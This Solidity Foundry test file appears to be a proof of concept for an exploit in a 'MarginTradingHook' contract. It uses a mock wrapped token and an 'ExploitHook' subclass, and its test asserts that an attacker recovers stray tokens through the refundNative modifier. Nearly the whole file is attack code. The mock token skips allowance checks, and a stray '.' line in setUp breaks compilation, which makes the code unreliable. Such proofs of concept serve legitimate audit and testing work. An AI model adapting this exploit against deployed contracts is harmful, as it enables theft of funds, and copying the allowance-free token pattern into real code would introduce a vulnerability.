// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/MarginTradingHook.sol"; // adjust path as needed


contract MockWNATIVE {
    mapping(address => uint256) private balances;
    uint256 public totalSupply;
    string public name = "MockWNATIVE";
    string public symbol = "mWNATIVE";
    uint8 public decimals = 18;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalSupply += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        totalSupply -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdraw failed");
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
      
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
      
        return true;
    }
}


contract ExploitHook is MarginTradingHook {
    constructor(
        address _core,
        address _posManager,
        address _wNative,
        address _acm
    ) MarginTradingHook(_core, _posManager, _wNative, _acm) {}

      receive() external payable {}

    function exploit() external refundNative {
       
    }
}


contract ExploitTest is Test {
    ExploitHook exploitContract;
    MockWNATIVE mockWNative;
    address attacker = address(0xBEEF);


    address constant DUMMY_CORE = address(0x1);
    address constant DUMMY_POS_MANAGER = address(0x2);
    address constant DUMMY_ACM = address(0x3);

    function setUp() public {

        mockWNative = new MockWNATIVE();


        exploitContract = new ExploitHook(
            DUMMY_CORE,
            DUMMY_POS_MANAGER,
            address(mockWNative),
            DUMMY_ACM
        );

        vm.label(attacker, "Attacker");
        vm.label(address(exploitContract), "ExploitHook");
        vm.label(address(mockWNative), "MockWNATIVE");

.
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        uint256 strayAmount = 1 ether;


        vm.prank(attacker);
        mockWNative.deposit{value: strayAmount}();


        vm.prank(attacker);
        bool transferSuccess = mockWNative.transfer(address(exploitContract), strayAmount);
        require(transferSuccess, "Transfer failed");


        uint256 contractWNATIVE = mockWNative.balanceOf(address(exploitContract));
        assertEq(contractWNATIVE, strayAmount);


        uint256 balanceBefore = attacker.balance;


        vm.prank(attacker);
        exploitContract.exploit();


        uint256 balanceAfter = attacker.balance;
        assertGe(balanceAfter, balanceBefore + strayAmount - 0.01 ether);
    }
}
